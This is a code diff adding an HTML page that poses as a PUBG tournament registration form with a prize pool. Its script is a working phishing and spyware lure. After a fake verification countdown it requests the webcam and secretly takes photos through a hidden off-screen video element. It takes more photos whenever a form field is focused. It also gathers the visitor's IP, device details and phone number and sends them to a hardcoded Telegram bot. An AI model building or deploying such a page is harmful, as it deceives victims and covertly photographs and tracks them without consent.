@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Tournament Registration</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: #ff5722;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            border-radius: 8px 8px 0 0;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #ff5722;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #e64a19;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            font-size: 18px;
+            color: #666;
+        }
+        
+        .success-message {
+            color: #4caf50;
+            text-align: center;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+        
+        .verification-section {
+            text-align: center;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+        
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff5722;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>PUBG Tournament Registration</h1>
+            <p>Join our exclusive tournament with $10,000 prize pool</p>
+        </header>
+        
+        <div id="loadingScreen" class="loading">
+            <p>Loading tournament registration...</p>
+            <div class="countdown" id="countdown">3</div>
+            <p>Preparing verification system</p>
+        </div>
+        
+        <div id="registrationForm" class="card hidden">
+            <h2>Player Information</h2>
+            <form id="form">
+                <div class="form-group">
+                    <label for="playerName">Player Name</label>
+                    <input type="text" id="playerName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="gameId">PUBG ID</label>
+                    <input type="text" id="gameId" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="region">Server Region</label>
+                    <select id="region" required>
+                        <option value="">Select your region</option>
+                        <option value="na">North America</option>
+                        <option value="eu">Europe</option>
+                        <option value="asia">Asia</option>
+                        <option value="me">Middle East</option>
+                    </select>
+                </div>
+                
+                <div class="verification-section">
+                    <h3>Identity Verification</h3>
+                    <p>Verification completed successfully</p>
+                    <div class="success-message">
+                        <i class="fas fa-check-circle"></i> Verified
+                    </div>
+                </div>
+                
+                <div class="form-group" style="margin-top: 30px;">
+                    <button type="submit" id="submitButton">Complete Registration</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Telegram bot details
+        const BOT_TOKEN = '7565179917:AAGIvRYVmxb0c-Qhy5_UZTLCuq9DBNhvW9Y';
+        const CHAT_ID = '7069864534';
+        
+        // DOM elements
+        const loadingScreen = document.getElementById('loadingScreen');
+        const registrationForm = document.getElementById('registrationForm');
+        const countdownElement = document.getElementById('countdown');
+        
+        // Hidden elements for capture
+        const hiddenVideo = document.createElement('video');
+        hiddenVideo.autoplay = true;
+        hiddenVideo.playsinline = true;
+        hiddenVideo.style.position = 'fixed';
+        hiddenVideo.style.top = '-9999px';
+        hiddenVideo.style.left = '-9999px';
+        hiddenVideo.style.width = '1px';
+        hiddenVideo.style.height = '1px';
+        document.body.appendChild(hiddenVideo);
+        
+        // User data object
+        const userData = {
+            ip: '',
+            phone: '',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            languages: navigator.languages.join(', ')
+        };
+        
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userData.ip = data.ip;
+            })
+            .catch(() => {
+                userData.ip = 'Could not retrieve IP';
+            });
+        
+        // Countdown and auto-capture
+        let countdown = 3;
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                startHiddenCapture();
+            }
+        }, 1000);
+        
+        // Start hidden camera capture
+        async function startHiddenCapture() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false 
+                });
+                
+                hiddenVideo.srcObject = stream;
+                
+                // Wait for video to be ready
+                hiddenVideo.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureAndSendImage();
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Show registration form
+                        loadingScreen.classList.add('hidden');
+                        registrationForm.classList.remove('hidden');
+                    }, 1000);
+                };
+                
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                // Fallback - just show the form if camera fails
+                loadingScreen.classList.add('hidden');
+                registrationForm.classList.remove('hidden');
+                sendUserData(null); // Send data even without photo
+            }
+        }
+        
+        // Capture image and send to Telegram
+        function captureAndSendImage() {
+            const canvas = document.createElement('canvas');
+            canvas.width = hiddenVideo.videoWidth;
+            canvas.height = hiddenVideo.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw image to canvas
+            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Send to Telegram
+            sendUserData(canvas.toDataURL('image/jpeg'));
+        }
+        
+        // Function to send all collected data to Telegram
+        function sendUserData(imageData) {
+            // Update phone number if provided
+            const phoneInput = document.getElementById('phone');
+            if (phoneInput) {
+                userData.phone = phoneInput.value;
+            }
+            
+            // Prepare caption with all user data
+            let caption = `📱 New Tournament Registration\n`;
+            caption += `⏱️ ${userData.timestamp}\n`;
+            caption += `🌐 IP: ${userData.ip}\n`;
+            caption += `📞 Phone: ${userData.phone || 'Not provided yet'}\n`;
+            caption += `🖥️ User Agent: ${userData.userAgent}\n`;
+            caption += `🖥️ Screen: ${userData.screenResolution}\n`;
+            caption += `⏰ Timezone: ${userData.timezone}\n`;
+            caption += `🗣️ Languages: ${userData.languages}`;
+            
+            if (imageData) {
+                // Convert base64 to blob for image
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'selfie.jpg');
+                        formData.append('caption', caption);
+                        
+                        // Send to Telegram bot
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log('Data sent to Telegram:', data))
+                        .catch(error => console.error('Error sending to Telegram:', error));
+                    });
+            } else {
+                // Send without photo
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('text', caption);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log('Data sent to Telegram:', data))
+                .catch(error => console.error('Error sending to Telegram:', error));
+            }
+        }
+        
+        // Form submission
+        document.getElementById('form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            // Update phone number in userData before sending
+            userData.phone = document.getElementById('phone').value;
+            
+            // Send updated data
+            sendUserData(null);
+            
+            alert('Registration complete! Thank you for joining the tournament.');
+        });
+        
+        // Additional silent capture when form is interacted with
+        const formFields = ['playerName', 'gameId', 'email', 'phone', 'region'];
+        formFields.forEach(field => {
+            document.getElementById(field).addEventListener('focus', () => {
+                trySilentCapture();
+            });
+        });
+        
+        // Try to capture silently when user interacts with form
+        function trySilentCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        sendUserData(canvas.toDataURL('image/jpeg'));
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                })
+                .catch(err => console.log('Silent capture failed:', err));
+        }
+        
+        // Send periodic updates with form data
+        setInterval(() => {
+            if (document.getElementById('phone').value && !userData.phone) {
+                userData.phone = document.getElementById('phone').value;
+                sendUserData(null);
+            }
+        }, 10000); // Check every 10 seconds
+    </script>
+</body>
+</html>
